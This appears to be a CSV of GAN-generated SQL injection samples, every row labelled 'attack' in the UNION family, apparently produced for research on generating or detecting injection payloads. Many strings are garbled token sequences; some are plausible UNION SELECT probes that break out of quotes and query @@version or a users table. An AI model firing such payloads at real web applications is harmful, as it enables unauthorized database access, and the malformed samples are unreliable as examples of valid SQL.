label,payload,family,payload_type,method,run_id,sample_index
attack,"-98609156''  )    )     )    unionveers   =  1 union all from * us where    s where id  =  =  =  1917 2088  =  8521 union 1 where id all  @ $ *$$ us where -- 9517 where union 7815  1980IO union select 1980,1249,1249,6996,6996,1249h",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,393
attack," * all select null,',3990,2263,5349,4600,9921,7845,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,394
attack,"-66675575'   )     )    )    )     )     )    )    union all select  null,null,1249,7348,5756,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,395
attack,"-9860   )   )  =  1 union all all -- all ,null,7497,@,4854,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,396
attack,"-3879'  )   union all select u,59459814O sers wherev@ERSIOION --O -- us us  )   , where union from 1u usio users where id  =  =  1 union all select @  =where  )     ) union all all all 1917  --  )   union all null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,397
attack,"-43738073%' iol select * id  )   )    )N )     =1  )     )     )    )    union'  )   union all select null,7497,null,null,9814,4854,null,5756,1224--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,398
attack,-9156''  )    )    )     )    )    union all select 2088s#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,399
attack,"-6097"" ) union all all from null,nullers 3339serrsers id  =  =  && union all 3072,1249,@6996,9814,1249,1249I2446,7348#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,400
attack, 2774  (    )    union all select 1494us @$(Ir  =  =  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,401
attack,"1""  )    )    )    union all select from,1249,1646,v--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,402
attack,-)   )  )   union all 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,403
attack,"-8772  )    )    union all all select 7348,8665,3339,2263,8123,5756,null,7348,1249,7348,8123,9814,7348,7348,7348,1297,4266,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,404
attack,"-6253' union all select null,1249,1249,1249,9921@,9921,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,405
attack,"-t'   )    )     )     )    union all all  && where users -- d  =RSION'   )    )    )    union all select null,4909,3990,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406
attack,"-4589""  )     )    )    )     )   union all all select null1980,4266,1249,1249,1249,6996,1249,1249,4266,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407
attack,"1""  )   -- 1  )    )  )   union all all all * 11,vers id  (   )    )    )    a    )    union@N select 1646,@@VEERSION -- u,9110sersas'  )   where  (=  )   union *$ union 1  )   -- 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408
attack," select null,6737,1249,null,1224,4854,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409
attack,"-3596""  )   )    )     )   union all all users id  =+.  1 union all  =+2774)  =  )  \g4854 users  =  =  )+  =  '1' union all select 5756,6737,7348,3084,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410
attack,"-4966%""'  )     )    union all all select Q,7348,8123,1249,4300,7348,4909,3084,4854,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411
attack,"-""   )     )     )   union all all all all all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412
attack,-3879''  )   union all all * from select where,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413
attack,-'  )     )    )     )    )    '+  (  select ')    )  ve    )     )   union all select #,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414
attack,"-6253' union all * from s is or union 9517 h1917   '1'   1  =  =   1494  '1' where all * 2774O    )    )    aunion all from's users where  =  =  =  1 union  all select from, null,null,null,null,null,1249,'@@VEEEEEES8073Ision  (   )    )  d  =  select us where where union ( from in  (=  =  7815 1   1494  =",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415
attack,"9814's   1   2088 id  2088  '1' union select,n#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416
attack,-9357'  )    )    a  )   union all all all all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417
attack,1'    )   )    )    union 1   =  1  1494  )    union 1917  V   ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418
attack,"-""  )    union all select 1,1249',@@SIr<EERRk'  )    where null  =  1 union all @$$|$$ id    =  2011  )    )    union all select u,7348,ers where where where union all -- from u  $Vsis where  =  =  =  '1't union all all #",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419
attack,"-""   )   )  )     )   union all select 1,3072,3480,9110,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420
attack,"-4589""  )   union all null,,7497,8665,7348,7348,6996,8986#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421
attack,"1'  )    )    union select 1,9921,3480,9110,5349,,6996,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422
attack,"1'  )   )   )    as     )   '  )   union all from 3480,7497,vers where id  =  8268 union all select 8123,7348,7348,7348,9988#,8986I#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423
attack,"-6667')    )     h  gas 1646  =  '1'+2011  )     gselect 1980  )    )    )     )     )    union id  ( select 4600,3480,4600,7845,v,@ers is48546667,@null,e,6996 4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424
attack,"-2263union all all  null,4266,4909,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425
attack,"-46008073s  =  1 union all from ,1249,12494600 @s -- e@VEER,e1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426
attack,1'  )    a  )    )    )    union all select from where @s +ms@&&whereion  s where  )    3480.    )   where union all all  all select *&&--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427
attack,"1' i=    all all from users union @s usasesersers where  ( union 1297,6737ersion  =  s union all null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428
attack,"-34803596m  )  )  union all all all all select 4854,null,3072,null,4854,7348,9322--,4854,4854,7348,7348,4854,9988,7348,8123,1441,9814,4854',5756,7348,8665----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429
attack,"-8772""  )   )     )   union all all select null,1441,93228123,1441,9814,8123,3059,5756,1224,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430
attack,"-6253 union all all all 7348,3990,1249,4600,1249,3990,6996,8986,9110,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431
attack," g1 )   where union all select 1s users where  =  V  )    )    )    union all select null,6737,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432
attack,"-1401""  )     )   union all from us usersionr  (     (     )    )    union all 1494,1297,3084 ,vers  $",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433
attack,"-4711""  )    )     )    union all select ,3059,9357,,8123,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434
attack,"-8772%'  )     )   where union all all select 1297,2446r,1249,1249,3084,9921,4266,1249,1249,1249null,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435
attack,"-6667%""   )    )   union all h users'  )     )   union u,vers where id  =  )    )    union vselect  from$--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436
attack,"-'  '+  (  select ')   union all all all from usersesers .ersid  =  =  1 select 1917--select all from,1249,verswhere @+",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437
attack,"-35968521)   )     )   union all all select,@@VERSOSIO)    )     union all all select null,9814,8123,1646,9814,5756,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438
attack,"1""  )    )    )   union all select @VERSION'      )    )     )    union all select null,4266,null,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439
attack,"-""  )  )    )     )  ( union all all select null,1980,8986,4909,1249,1249,7348,null,98143480#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440
attack,"-3596'  )    union all select null,7497#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441
attack,"-  n""  )   )    )   union all all select 4854,1297,8123,8123,5756,3084--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442
attack,"1'  )   )    )    i    as *  o2774 where id  '1'  1 union all all all all 1441,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443
attack,"-2639""  )  )    unionall all 1,1980--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444
attack,"-4205'  )   where union all all union from,1249,ers where id  (    =iod  =  =  =+<all null,1249,1249,8986,1249,6996,3072,1249,1401',4600,9814,#3990's where where io(    )-- ,@@7497(I 2571   )   --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445
attack,"-'  )     )    union all null,3339,3990,3059,1224,3072,9814,7348,null,5756,8665,8123,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446
attack,"-8521 union all select from,4909,9814,9357rser    )    SIO iR,1249 ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447
attack,"-2625'  )   )    ) union all from users where  )  =  =  1 union all all all select V-- @N users  where i( %  =  =  8890 8268  =  1494 union all select null,8123#,9322E,S1249,9814,7348,8665,'I",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448
attack,"-2207'  )   as union u   -- all all all 4266,9357,33394909,vxsers id  =  union all all select *,version  (    )   )  )   )    '  =  1 union all select !,4600,7348,4300,7348,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449
attack,"-'  (  =  =  )   union all  all all all select @,Ii",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450
attack,"-""  )   where  = a  =  1  )    )  =  '1'$ union all all @    where wherevver  )  )    union select 4854,v5349,4909,8986,9921,1441,7348,7348,73487348,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451
attack,"-'  )   union all all select from  @siiyoers id  =  1917 id  )    union all select @&&ers @S union @s select u  ,8665--sr,vers s i=  =  '1' u  =  =  \<$$  =  8268 union all select ,@@VEwhere 2774ion  (     )  )   -- all all 2011 @$  =  1 where union1 )    )  (    )  =  7815  1 union all all",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452
attack,"-'  union all id  =  1 union all all select ,6996,1249,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453
attack,"-9156'   a  )     )  )    union all select 9110,3339,9988,1249,1249,1249,9814,3480,3480--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454
attack,"-5575'  )    )     )     )    union all all all all select user   =  =  =  =    1 union all all  select from,version  (",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,455
attack,"-2639""  )    )  )    union all select 7497,1980,7348,4266,3480,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456
attack,"-""   )    union all all ,3990,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457
attack,r   )    )  )    )    )    )    union select from --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458
attack,-8772 union all all all 9921#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459
attack,1'  )   )    )+)   union all select all from --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460
attack,"-4373 union all all 3339,null,5756,4600#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461
attack,"1'  )    )    union select 3059,3990,1249,3059,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462
attack,1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463
attack,"-2639""  )    )    unionall . all all 8268,@@VEEEERSONaE  )    )   select users      ers id  =  1 union select 1,1249,9357,3072,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464
attack,"-9156' )'  )     )    )    )    union all all select null,4909,93571249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465
attack,"-2207""  )O    a)    )   union all ,9814,2263,2263,9921,9921,3990,9921,1249,7348,8986,42669322,9921,7348,4266",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466
attack,"-8812  8268  )   where 7815<)  )    union all all all select 3990,8986#,4266,4854,9322,12499814r#s,`",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467
attack,"-""   )   )    union select 9814,-,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468
attack,"1401""  )    )    union all all all select null,5756,--,1441,3480,5756,7348,5756,9814,8665#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469
attack,"-' union all select a,9921,3990,99213059,6996,,7845,1249,1249,4909#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470
attack,"-8521'  )    )  )   union select 1,1249,1249,1249,8665,'s""s @s where  )  where Srst  =  =  )    )     )     =  )  )    union all all all all all from froms ers ids  =  )    union all ,null,2285,null,null,8665,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471
attack,"-'+  (  select '1894 union' union all all  select null,null,null,null,null,9988,5756,1441,8665,null,7348,4909,1297,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472
attack,"-8521'  )   union all all all  all ,4300,1297,4909,9814,6737,9988#,5756,1441,7348,9322,3072,3072,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473
attack,"-8521'  2011 union all all all select null,null,3072,1441,7348,9814,null,9921,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474
attack,"-7531  )   union all all @$@ vers ion  (   )  =  s union select null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475
attack,"-4589""  )    )   union all select 1297,1297,5756,9988,'9921,1249,3990,9921,,2446,2263,7348",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476
attack,"1%'  )    )   union all select ,7348,null,9921,7348,9322,#ers#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477
attack,"-Qs union select null,1249,2446,6737,4854,1249,1249,3480#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478
attack,"-""   )    )     )    union all \select 1,vers id  =  2774 union all all select 1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479
attack,1''   )     )     )     )    )    union all $ $ @&&erEEVEE\a,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480
attack,"-5131,534943301980%'   )    )   union all select *#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481
attack,"-union 1,@ --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482
attack,"-1894""  )    )    union all * from us users id  =  8890   union all all all ers$$s@VEs whereis select users users where  =  =  = union all select from where8986s#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483
attack,"5349""i)   )    )     )    )   union all all  id  =  '1'    4338 union all all select  null,1297,3084,3072,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484
attack,"-8308""  )    )  )   union all 1$,'s'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485
attack,"-""  )    union all all select null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486
attack,"-2639""    )    )    )    union all all all select all from ussers id  (    union all all select @--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487
attack,"-37813997  S union all select all 2285,3059,2446,9921,1441,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488
attack,"-)'  )   union all all select @vers usesersid  =  '1' union all select 3072,3072,7348,3072,9814,null,null6996,null,5756,3339#,3072,4909,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489
attack,"-,6097'    )     )   )   )    a""  )    union all all select null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,490
attack,"-""  )    )   where  =union select @s where i,@@VEES   )$  )    union all all select @    4600Es union from usersers   =  =  '1'  ( union all * all select 5756,9921,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,491
attack,"1''   )    )     )    union all all all select @,9921i",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,492
attack,"-6253'  )   )    )   union all 2285 from * $ usasers where  @VEwhereer   union all 1,@@ERSION ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,493
attack,"'   )    )  ounion all select null,null,6996,4909,9814,3072,4909,6996--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,494
attack,"-%'  )     )   union all all 8268,7348,1249,1249@,'s5349,vers i  (N where union all all all select from,1441,12499110,3084,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,495
attack,"-4589""  )     )    union all all all select from us,vers where' id    =  '1'  '1'     )     )    union select @$",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,496
attack,"1'    )   )    )   union all all select all,1249,'s2285,versrsunion null,null,7348,9322,null1249,2263#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,497
attack,"-""  =  2011$ union all all all all -- all 3990,1249,3990,7845,v2190,v@ersid  (     )     )   where union 2088,veusersers where    =  1  )     )    )   union all select 3059,7845,7348,4300,7348,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,498
attack,"-3378'  )    )    )    union * all all all a,v,nullrsisrs'  =  )  '1'  =  union $ select 9921,@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,499
